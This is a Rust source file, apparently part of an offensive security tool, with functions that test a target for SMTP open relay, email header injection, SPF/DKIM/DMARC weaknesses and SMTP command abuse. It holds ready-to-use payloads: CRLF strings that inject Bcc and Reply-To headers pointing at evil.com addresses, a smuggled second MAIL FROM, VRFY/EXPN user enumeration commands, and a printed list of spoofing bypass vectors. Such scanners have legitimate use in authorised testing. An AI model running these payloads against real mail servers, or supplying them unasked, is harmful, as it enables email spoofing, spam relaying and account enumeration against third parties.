use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SMTP Open Relay Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let test_cases = [
        (
            "Direct relay",
            "MAIL FROM:<test@external.com> RCPT TO:<test@another.com>",
        ),
        (
            "IP spoof",
            "MAIL FROM:<test@localhost> RCPT TO:<test@external.com>",
        ),
        (
            "Domain spoof",
            "MAIL FROM:<test@target.local> RCPT TO:<test@external.com>",
        ),
        ("Null sender", "MAIL FROM:<> RCPT TO:<test@external.com>"),
        (
            "Percent hack",
            "MAIL FROM:<test%external.com@target> RCPT TO:<test@external.com>",
        ),
        (
            "Bang path",
            "MAIL FROM:<test!external.com@target> RCPT TO:<test@external.com>",
        ),
    ];

    for (name, smtp_cmd) in &test_cases {
        let body = serde_json::json!({"action": "smtp_test", "host": url, "command": smtp_cmd});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let relayed = text.contains("250")
                    || text.contains("queued")
                    || text.contains("accepted")
                    || (status == 200 && !text.contains("relaying denied"));
                let tag = if relayed {
                    "OPEN RELAY".red().bold().to_string()
                } else {
                    "relaying denied".to_string()
                };
                println!("  {} {:20} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SMTP Header Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("From CRLF", "test@example.com\r\nBcc: victim@evil.com"),
        ("Subject CRLF", "Hello\r\nBcc: victim@evil.com"),
        ("To CRLF", "user@target.com\r\nBcc: victim@evil.com"),
        ("From LF", "test@example.com\nBcc: victim@evil.com"),
        (
            "Reply-To inject",
            "test@example.com\r\nReply-To: attacker@evil.com",
        ),
        (
            "Double CRLF body",
            "test@example.com\r\n\r\nInjected body content",
        ),
    ];

    for (name, payload) in &payloads {
        let body = serde_json::json!({"action": "smtp_send", "host": url, "from": payload, "to": "user@target.com", "subject": "test", "body": "test"});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let injected =
                    text.contains("queued") || text.contains("accepted") || status == 200;
                let tag = if injected {
                    "INJECTION ACCEPTED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:20} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn spf(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SPF/DKIM/DMARC Bypass Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Domain: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let domain = url
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .trim_end_matches('/');

    let checks = [
        (
            "SPF record",
            serde_json::json!({"action": "dns_query", "domain": domain, "type": "TXT"}),
        ),
        (
            "DMARC record",
            serde_json::json!({"action": "dns_query", "domain": format!("_dmarc.{}", domain), "type": "TXT"}),
        ),
        (
            "DKIM selectors",
            serde_json::json!({"action": "dns_query", "domain": format!("default._domainkey.{}", domain), "type": "TXT"}),
        ),
    ];

    for (name, body) in &checks {
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let text = resp.text().await.unwrap_or_default();
                if text.contains("v=spf1") {
                    println!(
                        "  {} {} — SPF found: {}",
                        "[+]".green().bold(),
                        name,
                        text.chars().take(60).collect::<String>()
                    );
                    if text.contains("v=spf1 *")
                        || text.contains("v=spf1 ?all")
                        || text.contains("v=spf1 +all")
                    {
                        println!(
                            "    {} Weak SPF policy — spoofing possible!",
                            "[!]".red().bold()
                        );
                    }
                } else if text.contains("v=DMARC1") {
                    println!(
                        "  {} {} — DMARC found: {}",
                        "[+]".green().bold(),
                        name,
                        text.chars().take(60).collect::<String>()
                    );
                    if text.contains("p=none") {
                        println!(
                            "    {} DMARC policy=none — no enforcement!",
                            "[!]".red().bold()
                        );
                    }
                } else if text.contains("DKIM") || text.contains("v=DKIM1") {
                    println!("  {} {} — DKIM record found", "[+]".green().bold(), name);
                } else {
                    println!("  {} {} — No record found", "[-]".dimmed(), name);
                }
            }
            Err(_) => println!("  {} {} — query failed", "[-]".dimmed(), name),
        }
    }

    let bypass_vectors = [
        (
            "Return-Path spoof",
            "Set Return-Path to pass SPF while From is spoofed",
        ),
        ("Mail-From mismatch", "Different MAIL FROM and From header"),
        (
            "DKIM replay",
            "Replay valid DKIM-signed email to different recipients",
        ),
        (
            "Subdomain spoof",
            "Spoof from non-existent subdomain without DMARC",
        ),
    ];

    println!("\n  {} Bypass vectors:", "[*]".cyan().bold());
    for (name, desc) in &bypass_vectors {
        println!("    {} {} — {}", "*".cyan(), name, desc);
    }

    Ok(())
}

pub async fn command(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SMTP Command Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let commands = [
        ("VRFY user enum", "VRFY root"),
        ("VRFY wildcard", "VRFY *"),
        ("EXPN expand", "EXPN postmaster"),
        ("EXPN list", "EXPN all-users"),
        ("NOOP abuse", "NOOP 999999"),
        ("RSET abuse", "RSET\r\nMAIL FROM:<attacker@evil.com>"),
        ("EHLO overflow", "EHLO AAAA...AAAA"),
        ("DEBUG mode", "DEBUG"),
        ("TURN command", "TURN"),
    ];

    for (name, cmd) in &commands {
        let body = serde_json::json!({"action": "smtp_raw", "host": url, "command": cmd});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let interesting = text.contains("250")
                    || text.contains("252")
                    || text.contains("200")
                    || text.contains("user");
                let tag = if interesting {
                    format!("RESPONSE: {}", text.chars().take(40).collect::<String>())
                        .yellow()
                        .bold()
                        .to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:20} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:20} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}
